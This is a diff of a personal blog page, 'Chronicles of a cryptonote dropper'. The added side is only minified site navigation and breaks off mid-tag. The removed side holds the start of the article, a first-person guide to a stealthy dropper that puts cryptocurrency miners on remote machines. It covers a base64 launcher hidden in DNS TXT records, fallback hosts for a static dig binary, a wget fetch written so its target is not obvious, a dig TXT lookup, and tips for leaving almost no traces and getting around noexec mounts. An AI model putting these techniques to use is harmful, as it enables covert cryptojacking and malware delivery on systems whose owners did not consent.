@@ -1,513 +1,367 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-    <script type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://unto.re","url":"https://unto.re","copyrightYear":2021,"@context":"https://schema.org/","@type":"WebSite"}</script>
-    <script type="application/ld+json">{"audience":"cool people","url":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","author":"untoreh","description":"...How far are you willing to go for...pennies?","mentions":[],"accessModeSufficient":{"itemListElement":["textual","visual"],"description":"text and images","@type":"itemList"},"lastReviewed":"August 21, 2021","@type":"https://schema.org/WebPage","dateCreated":"August 21, 2021","@id":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"August 21, 2021","abstract":"...How far are you willing to go for...pennies?","headline":"Chronicles of a cryptonote dropper","creativeWorkStatus":"Published","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"datePublished":"August 21, 2021","inLanguage":"English","name":"Chronicles of a cryptonote dropper","identifier":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html"}</script>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  
-   <link rel="stylesheet" href="/libs/highlight/github.min.css">
-   
-  <link rel="stylesheet" href="/css/franklin.css">
-<link rel="stylesheet" href="/css/main.css">
-<link rel="stylesheet" href="/css/menu.css">
-<link rel="stylesheet" href="/css/pages.css">
-<link rel="stylesheet" href="/css/lunr.css">
-<link rel="stylesheet" href="/css/footer.css">
-<link rel="stylesheet" href="/css/responsive.css">
-<link rel="stylesheet" href="/css/animations.css">
-<link rel="stylesheet" href="/css/docco.css">
-<!-- <link rel="stylesheet" href="/css/flag-icon.min.css"> -->
-<link rel="stylesheet" href="/css/flags-sprite.css">
-<link rel="icon" href="/assets/favicon.png">
-<!--[if IE ]>
-<![endif]-->
-
-  <title>Chronicles of a cryptonote dropper</title>
-  <script src="/libs/lunr/lunr.min.js"></script>
-<script src="/libs/lunr/lunr_index.js"></script>
-<script src="/libs/lunr/lunrclient.min.js"></script>
-<!-- <script src="/libs/lunr/lunrclient.js"></script> -->
-
-  <script src="/libs/load.js"></script>
-  <!-- end custom head snippets -->
-</head>
-<body class="">
-    <div class="masthead">
-  <div class="masthead__inner-wrap">
-    <div class="masthead__menu">
-      <a class="site-title" href="/"></a> <div class="author__wrap">
-    <script type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"description":"<ul>\n<li><p><strong>Name</strong>: Francesco Giannelli</p>\n</li>\n<li><p><strong>Website</strong>: &#91;«https://unto.re»&#93;, the place where I put stuff I should remember...or forget</p>\n</li>\n<li><p><strong>Location</strong>: south italy {{bio_link}}</p>\n</li>\n<li><p><strong>Year</strong>: &#39;91</p>\n</li>\n</ul>\n","image":"/assets/appa.png","name":"untoreh","@type":"https://schema.org/Person","email":"contact@unto.re"}</script>
-    <ul>
-        <li onclick="toggleTheme()" class="author__avatar">
-        <img class="flip-front" src="/assets/appa.png" alt=
-        "untoreh-light"></li><li class="author__urls social-icons">
-    <a href="https://twitter.com/untoreh" rel=
-    "nofollow noopener noreferrer"><i class=
-    "fab fa-fw fa-twitter-square" aria-hidden="true"></i></a>
-</li>
-<li class="author__urls social-icons">
-    <a href="https://github.com/untoreh" rel=
-    "nofollow noopener noreferrer"><i class="fab fa-fw fa-github"
-    aria-hidden="true"></i></a>
-</li>
-<li class="author__urls social-icons">
-    <a href="mailto:contact@unto.re"><i class=
-    "fas fa-envelope"></i></a>
-</li>
-<li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script></li>
-
-    </ul>
-</div>
-
-      <nav id="site-nav">
-        <div class="horiz">
-          <ul>
-    <li id="lunrSearch" class="masthead__menu-item hvr-outline-in"><form id="lunrSearchForm" name="lunrSearchForm">
-<button class="search-button" type="submit" value="Search" formaction="/search/index.html">
-    <i class= "fas fa-search menu-icons"></i></button>
-<input class="search-input" name="q" placeholder="Search&#8230;" type="text">
-</form>
-</li>
-    <li class="masthead__menu-item hvr-outline-in">
-        <a href="/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i>posts</a>
-    </li>
-    <li class="masthead__menu-item hvr-outline-in">
-        <a href="/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i>about</a>
-    </li>
-    <li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language">
-        <button class="langs-dropdown-wrapper">
-            <i class="fas fa-language menu-icons"></i> Lang
-            <div id="langs-dropdown-menu" class="langs-dropdown-content">
-                <ul id="lang-list"><a class="lang-link" id="lang-ar" href="/ar/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-sa"></span>Arabic</a><a class="lang-link" id="lang-bn" href="/bn/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-bd"></span>Bengali</a><a class="lang-link" id="lang-nl" href="/nl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-nl"></span>Dutch</a><a class="lang-link" id="lang-en" href="/en/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gb"></span>English</a><a class="lang-link" id="lang-tl" href="/tl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ph"></span>Filipino</a><a class="lang-link" id="lang-fr" href="/fr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-fr"></span>French</a><a class="lang-link" id="lang-de" href="/de/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-de"></span>German</a><a class="lang-link" id="lang-el" href="/el/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gr"></span>Greek</a><a class="lang-link" id="lang-hi" href="/hi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Hindi</a><a class="lang-link" id="lang-it" href="/it/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-it"></span>Italian</a><a class="lang-link" id="lang-ja" href="/ja/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-jp"></span>Japanese</a><a class="lang-link" id="lang-jw" href="/jw/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-id"></span>Javanese</a><a class="lang-link" id="lang-ko" href="/ko/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-kr"></span>Korean</a><a class="lang-link" id="lang-ms" href="/ms/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ms"></span>Malay</a><a class="lang-link" id="lang-zh" href="/zh/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link" id="lang-pl" href="/pl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pl"></span>Polish</a><a class="lang-link" id="lang-pt" href="/pt/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link" id="lang-pa" href="/pa/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Punjabi</a><a class="lang-link" id="lang-ro" href="/ro/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ro"></span>Romanian</a><a class="lang-link" id="lang-ru" href="/ru/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ru"></span>Russian</a><a class="lang-link" id="lang-es" href="/es/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-es"></span>Spanish</a><a class="lang-link" id="lang-sv" href="/sv/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-se"></span>Swedish</a><a class="lang-link" id="lang-th" href="/th/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-th"></span>Thai</a><a class="lang-link" id="lang-tr" href="/tr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-tr"></span>Turkish</a><a class="lang-link" id="lang-uk" href="/uk/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link" id="lang-ur" href="/ur/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pk"></span>Urdu</a><a class="lang-link" id="lang-vi" href="/vi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link" id="lang-zu" href="/zu/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-za"></span>Zulu</a></ul>
-            </div>
-        </button>
-    </li>
-</ul>
-
-        </div><button class="ham"><i class=
-        "fas fa-bars ham-icon"></i></button>
-        <div class="vert">
-          <ul>
-    <li id="lunrSearch" class="masthead__menu-item hvr-outline-in"><form id="lunrSearchForm" name="lunrSearchForm">
-<button class="search-button" type="submit" value="Search" formaction="/search/index.html">
-    <i class= "fas fa-search menu-icons"></i></button>
-<input class="search-input" name="q" placeholder="Search&#8230;" type="text">
-</form>
-</li>
-    <li class="masthead__menu-item hvr-outline-in">
-        <a href="/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i>posts</a>
-    </li>
-    <li class="masthead__menu-item hvr-outline-in">
-        <a href="/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i>about</a>
-    </li>
-    <li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language">
-        <button class="langs-dropdown-wrapper">
-            <i class="fas fa-language menu-icons"></i> Lang
-            <div id="langs-dropdown-menu" class="langs-dropdown-content">
-                <ul id="lang-list"><a class="lang-link" id="lang-ar" href="/ar/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-sa"></span>Arabic</a><a class="lang-link" id="lang-bn" href="/bn/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-bd"></span>Bengali</a><a class="lang-link" id="lang-nl" href="/nl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-nl"></span>Dutch</a><a class="lang-link" id="lang-en" href="/en/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gb"></span>English</a><a class="lang-link" id="lang-tl" href="/tl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ph"></span>Filipino</a><a class="lang-link" id="lang-fr" href="/fr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-fr"></span>French</a><a class="lang-link" id="lang-de" href="/de/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-de"></span>German</a><a class="lang-link" id="lang-el" href="/el/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gr"></span>Greek</a><a class="lang-link" id="lang-hi" href="/hi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Hindi</a><a class="lang-link" id="lang-it" href="/it/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-it"></span>Italian</a><a class="lang-link" id="lang-ja" href="/ja/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-jp"></span>Japanese</a><a class="lang-link" id="lang-jw" href="/jw/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-id"></span>Javanese</a><a class="lang-link" id="lang-ko" href="/ko/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-kr"></span>Korean</a><a class="lang-link" id="lang-ms" href="/ms/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ms"></span>Malay</a><a class="lang-link" id="lang-zh" href="/zh/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class="lang-link" id="lang-pl" href="/pl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pl"></span>Polish</a><a class="lang-link" id="lang-pt" href="/pt/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pt"></span>Portuguese</a><a class="lang-link" id="lang-pa" href="/pa/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Punjabi</a><a class="lang-link" id="lang-ro" href="/ro/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ro"></span>Romanian</a><a class="lang-link" id="lang-ru" href="/ru/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ru"></span>Russian</a><a class="lang-link" id="lang-es" href="/es/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-es"></span>Spanish</a><a class="lang-link" id="lang-sv" href="/sv/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-se"></span>Swedish</a><a class="lang-link" id="lang-th" href="/th/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-th"></span>Thai</a><a class="lang-link" id="lang-tr" href="/tr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-tr"></span>Turkish</a><a class="lang-link" id="lang-uk" href="/uk/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ua"></span>Ukranian</a><a class="lang-link" id="lang-ur" href="/ur/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pk"></span>Urdu</a><a class="lang-link" id="lang-vi" href="/vi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-vn"></span>Vietnamese</a><a class="lang-link" id="lang-zu" href="/zu/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-za"></span>Zulu</a></ul>
-            </div>
-        </button>
-    </li>
-</ul>
-
-        </div>
-      </nav>
-    </div>
-  </div>
-</div>
-
-    
-            <div>
-            <h1 id="title"><a href="/posts/chronichles_of_a_cryptonote_dropper">Chronicles of a cryptonote dropper</a></h1>
-            <blockquote id="page-description" style="font-style: italic;">
-                ...How far are you willing to go for...pennies?
-            </blockquote>
-            </div>
-          
-
-
-<!-- Content appended here -->
-
-<div class="franklin-content">
-<p>Assume you want to mine <a href="https://en.wikipedia.org/wiki/Cryptocurrency">cryptocurrencies</a> on remote <em>virtual</em> hardware. You need to find something to mine. Remote servers means, no <a href="https://en.wikipedia.org/wiki/Application-specific_integrated_circuit">ASICS</a> or GPU proof of work algorithms, basically only <a href="\posts/a-few-notes-on-proof-of-work">CPU friendly coins</a>.</p>
-<h2 id="the_software"><a href="#the_software" class="header-anchor">The software</a></h2>
-<p>Search and find a <a href="https://github.com/xmrig/xmrig">miner</a>, but it is not really nice, you would like something you can better control from remote, so you find <a href="https://github.com/Bendr0id/xmrigCC">another miner</a>. You also want a <a href="https://github.com/Bendr0id/xmrigcc-proxy">proxy</a>, because many connections will be short lived, you don&#39;t want to <a href="https://en.wikipedia.org/wiki/Denial-of-service_attack">dos</a> your mining pool. Also a <a href="https://github.com/search?q&#61;tunnel">tunnel</a> would be nice.</p>
-<h2 id="the_design"><a href="#the_design" class="header-anchor">The design</a></h2>
-<p>Some botnets use blockchains data to lookup commands, <a href="https://twitter.com/sarahjamielewis">somebody</a> also appears to have <a href="https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968">lost bets</a> on this not happening again...anyway we are not that sophisticated, we will get by with some DNS records that store a script that pulls the payload which self extract in a temp directory executes and leaves <em>almost</em> no traces of its setup. Here is a small flow chart which depicts the structure</p>
-<img src="/assets/posts/output/payload.png" alt="">
-<h2 id="launcher"><a href="#launcher" class="header-anchor">Launcher</a></h2>
-<p>The point of a startup script is to be accessible and easily updatable such that it withstands the test of time. Updating <a href="https://en.wikipedia.org/wiki/Domain_Name_System">DNS</a> records is easy, and DNS is the last thing that gets shutdown within a network..because IP addresses are hard to remember...so chances are it is going to be available most of the times. You see when we are <em>fetching the deployment script</em> we are actually already running some logic, this is the launcher script, it needs the ability to perform DNS queries to lookup our records, DNS might be ubiquitous but <a href="https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/">dig</a> is not.</p>
-<p>There is a little bit of a conundrum here, if we have to download another tool <em>to download another script to download the payload</em> we should just download the payload&#33; In defense...doing this scripty dance adds to obfuscation, allows to keep only one implementation of the launcher &#40;maintainability, yay&#41;, isn&#39;t required most of the times..so we also service a <a href="https://en.wikipedia.org/wiki/Standalone_program">statically linked</a> dig executable to perform dns queries, fetched either by self hosting, or cloud hosting &#40;yes there are fallbacks, like 3 or 4, because cloud services have very minimal free bandwidth, and also require cookies or access tokens...they are very script unfriendly, purposefully so , of course&#41;.</p>
-<p>What&#39;s in the dns records? We are using <a href="https://en.wikipedia.org/wiki/TXT_record">TXT</a> records, on a custom domain &#40;fallbacks here too&#41;. Why TXT? they happen to be the ones that can store the largest amount of data..usually since it is kind of <a href="https://www.ietf.org/rfc/rfc6763.txt">recommended</a> depending on <em>things</em>. We are specifically using <a href="https://www.cloudflare.com/">cloudflare</a> for our DNS fiddling since it is free, and pretty much the only player in town &#40;<em>well not really but any other alternative pales features wise</em>&#41;. It happens that you can store multiple pieces of data on the <em>same</em> record...this starts getting confusing and scramble for some specifications...&#40;tangent&#41; Cloudflare <a href="https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size">used to</a> allow <em>chained</em> TXT records totaling ~9k bytes, docs now state ~2k bytes, prior to the change I was using ~6k I think, and was serving the script uncompressed, after that I had to thin out the script and compress it before hand &#40;actually I tried to use a <a href="https://freedns.afraid.org/">freedns</a> provider, I was banned within one day, guessing they have a strict no-fat TXT records policy&#41;, however gzip compression appears to NOT be pipe friendly and was still causing problems, so I had to manage to cram the script in without compression &#40;end tangent&#41;.</p>
-<p>How do we store it? TXT records only support alphanumeric strings, no <a href="https://en.wikipedia.org/wiki/Null_character">NULs</a>, so we have to wrap it into a non null encoding, <a href="https://en.wikipedia.org/wiki/Base64">base64</a> satisfies this constraint, and because we are storing <em>chained</em> TXT records, we have to chunk the output, since we are using shell stuff, this is done through the <code>-w</code> flag, on busybox such flag used to be absent &#40;or opt-in&#41; on older versions which was annoying, an alternative is to use the encoder bundled with openssl, <code>openssl enc -base64</code>.</p>
-<p>Now that we know how to store our deployment script we store it with either <a href="https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md">cf cli</a> or manually. How do we pull it? We mentioned that we need bindutils or our own <code>dig</code>...after having chosen the serving endpoint, we want to download it, what is available is usually <a href="https://www.gnu.org/software/wget/">wget</a> or <a href="https://curl.se/">curl</a>, wget is found preinstalled much more often, however busybox only provides tls support with dynamic libraries, so you have to make sure the endpoint is serving http or your utility is <code>wget</code> from gnu-utils</p>
-<pre><code class="bash hljs"><span class="hljs-comment"># the wget command</span>
-wget -t 2 -T 10 -q -i- -O- &gt; <span class="hljs-variable">$filename</span> &lt;&lt;&lt; <span class="hljs-string">&quot;<span class="hljs-variable">$digurl</span>&quot;</span></code></pre>
-<p>It means try <code>-t2</code> times waiting <code>-T10</code> seconds being <code>-q</code> quiet reading from <code>-i-</code> stdin &#40;<code>&#36;digurl</code>&#41; and writing to <code>-O-</code> stdout &#40;<code>&#36;filename</code>&#41;. This command does not reveal what we are downloading on a first glance. We are going to be very careful with other shell commands for the same reason, or sticking with shell &#40;<a href="https://en.wikipedia.org/wiki/Bash_&#37;28Unix_shell&#37;29">bash</a>&#41; built-ins where possible. Take also care about where you are downloading your executables, you want to ensure you can execute them, since some mount points, especially in containers and <code>tmp</code> paths are <code>noexec</code>. Now that we have our dns querying tool we fetch our records</p>
-<pre><code class="bash hljs">dig txt <span class="hljs-variable">${record}</span>.<span class="hljs-variable">${zone}</span> +short +tcp +timeout=3 +retries=0 <span class="hljs-variable">$dnsserver</span></code></pre>
+<!doctype html> <html lang=en > <meta charset=UTF-8 > <script type="application/ld+json">{"copyrightHolder":"untoreh","@id":"https://unto.re","url":"https://unto.re","copyrightYear":2021,"@context":"https://schema.org/","@type":"WebSite"}</script> <script type="application/ld+json">{"audience":"cool people","url":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","author":"untoreh","description":"...How far are you willing to go for...pennies?","mentions":[],"accessModeSufficient":{"itemListElement":["textual","visual"],"description":"text and images","@type":"itemList"},"lastReviewed":"August 21, 2021","@type":"https://schema.org/WebPage","dateCreated":"August 21, 2021","@id":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"August 21, 2021","abstract":"...How far are you willing to go for...pennies?","headline":"Chronicles of a cryptonote dropper","creativeWorkStatus":"Published","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"datePublished":"August 21, 2021","inLanguage":"English","name":"Chronicles of a cryptonote dropper","identifier":"https://unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html"}</script> <meta name=viewport  content="width=device-width, initial-scale=1"> <link rel=stylesheet  href="/libs/highlight/github.min.css"> <link rel=stylesheet  href="/css/franklin.css"> <link rel=stylesheet  href="/css/main.css"> <link rel=stylesheet  href="/css/menu.css"> <link rel=stylesheet  href="/css/pages.css"> <link rel=stylesheet  href="/css/lunr.css"> <link rel=stylesheet  href="/css/footer.css"> <link rel=stylesheet  href="/css/responsive.css"> <link rel=stylesheet  href="/css/animations.css"> <link rel=stylesheet  href="/css/docco.css"> <link rel=stylesheet  href="/css/flags-sprite.css"> <link rel=icon  href="/assets/favicon.png"> <!--[if IE ]> <![endif]--> <title>Chronicles of a cryptonote dropper</title> <script src="/libs/lunr/lunr.min.js"></script> <script src="/libs/lunr/lunr_index.js"></script> <script src="/libs/lunr/lunrclient.min.js"></script> <script src="/libs/load.js"></script> <body class=""> <div class=masthead > <div class=masthead__inner-wrap > <div class=masthead__menu > <a class=site-title  href="/"></a> <div class=author__wrap > <script type="application/ld+json">{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"description":"<ul>\n<li><p><strong>Name</strong>: Francesco Giannelli</p>\n\n<li><p><strong>Website</strong>: &#91;«https://unto.re»&#93;, the place where I put stuff I should remember...or forget</p>\n\n<li><p><strong>Location</strong>: south italy {{bio_link}}</p>\n\n<li><p><strong>Year</strong>: &#39;91</p>\n\n</ul>\n","image":"/assets/appa.png","name":"untoreh","@type":"https://schema.org/Person","email":"contact@unto.re"}</script> <ul> <li onclick="toggleTheme()" class=author__avatar > <img class=flip-front  src="/assets/appa.png" alt= "untoreh-light"><li class="author__urls social-icons"> <a href="https://twitter.com/untoreh" rel= "nofollow noopener noreferrer"><i class= "fab fa-fw fa-twitter-square" aria-hidden=true ></i></a> <li class="author__urls social-icons"> <a href="https://github.com/untoreh" rel= "nofollow noopener noreferrer"><i class="fab fa-fw fa-github" aria-hidden=true ></i></a> <li class="author__urls social-icons"> <a href="mailto:contact@unto.re"><i class= "fas fa-envelope"></i></a> <li><script type="application/ld+json">{"potentialAction":{"query-input":"required maxlength=100 name=query","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":"https://unto.re/search?&q={query}"}}</script> </ul> </div> <nav id=site-nav > <div class=horiz > <ul> <li id=lunrSearch  class="masthead__menu-item hvr-outline-in"><form id=lunrSearchForm  name=lunrSearchForm > <button class=search-button  type=submit  value=Search  formaction="/search/index.html"> <i class= "fas fa-search menu-icons"></i></button> <input class=search-input  name=q  placeholder="Search&#8230;" type=text > </form> <li class="masthead__menu-item hvr-outline-in"> <a href="/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i>posts</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i>about</a> <li class="masthead__menu-item hvr-outline-in menu-lang-btn" title="Change website's language"> <button class=langs-dropdown-wrapper > <i class="fas fa-language menu-icons"></i> Lang <div id=langs-dropdown-menu  class=langs-dropdown-content > <ul id=lang-list ><a class=lang-link  id=lang-ar  href="/ar/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-sa"></span>Arabic</a><a class=lang-link  id=lang-bn  href="/bn/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-bd"></span>Bengali</a><a class=lang-link  id=lang-nl  href="/nl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-nl"></span>Dutch</a><a class=lang-link  id=lang-en  href="/en/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gb"></span>English</a><a class=lang-link  id=lang-tl  href="/tl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ph"></span>Filipino</a><a class=lang-link  id=lang-fr  href="/fr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-fr"></span>French</a><a class=lang-link  id=lang-de  href="/de/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-de"></span>German</a><a class=lang-link  id=lang-el  href="/el/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-gr"></span>Greek</a><a class=lang-link  id=lang-hi  href="/hi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Hindi</a><a class=lang-link  id=lang-it  href="/it/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-it"></span>Italian</a><a class=lang-link  id=lang-ja  href="/ja/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-jp"></span>Japanese</a><a class=lang-link  id=lang-jw  href="/jw/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-id"></span>Javanese</a><a class=lang-link  id=lang-ko  href="/ko/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-kr"></span>Korean</a><a class=lang-link  id=lang-ms  href="/ms/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ms"></span>Malay</a><a class=lang-link  id=lang-zh  href="/zh/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-cn"></span>Mandarin Chinese</a><a class=lang-link  id=lang-pl  href="/pl/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pl"></span>Polish</a><a class=lang-link  id=lang-pt  href="/pt/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pt"></span>Portuguese</a><a class=lang-link  id=lang-pa  href="/pa/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-in"></span>Punjabi</a><a class=lang-link  id=lang-ro  href="/ro/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ro"></span>Romanian</a><a class=lang-link  id=lang-ru  href="/ru/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ru"></span>Russian</a><a class=lang-link  id=lang-es  href="/es/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-es"></span>Spanish</a><a class=lang-link  id=lang-sv  href="/sv/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-se"></span>Swedish</a><a class=lang-link  id=lang-th  href="/th/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-th"></span>Thai</a><a class=lang-link  id=lang-tr  href="/tr/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-tr"></span>Turkish</a><a class=lang-link  id=lang-uk  href="/uk/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-ua"></span>Ukranian</a><a class=lang-link  id=lang-ur  href="/ur/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-pk"></span>Urdu</a><a class=lang-link  id=lang-vi  href="/vi/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-vn"></span>Vietnamese</a><a class=lang-link  id=lang-zu  href="/zu/posts/chronichles_of_a_cryptonote_dropper"><span class="flag flag-za"></span>Zulu</a></ul> </div> </button> </ul> </div><button class=ham ><i class= "fas fa-bars ham-icon"></i></button> <div class=vert > <ul> <li id=lunrSearch  class="masthead__menu-item hvr-outline-in"><form id=lunrSearchForm  name=lunrSearchForm > <button class=search-button  type=submit  value=Search  formaction="/search/index.html"> <i class= "fas fa-search menu-icons"></i></button> <input class=search-input  name=q  placeholder="Search&#8230;" type=text > </form> <li class="masthead__menu-item hvr-outline-in"> <a href="/posts/" title="All the articles that I have written"><i class="fas fa-pen menu-icons"></i>posts</a> <li class="masthead__menu-item hvr-outline-in"> <a href="/about/" title="Things about me, what I have read, past projects and ideas for future ones"><i class="fas fa-user-alt menu-icons"></i>about</a> <li class="masthead__menu-item 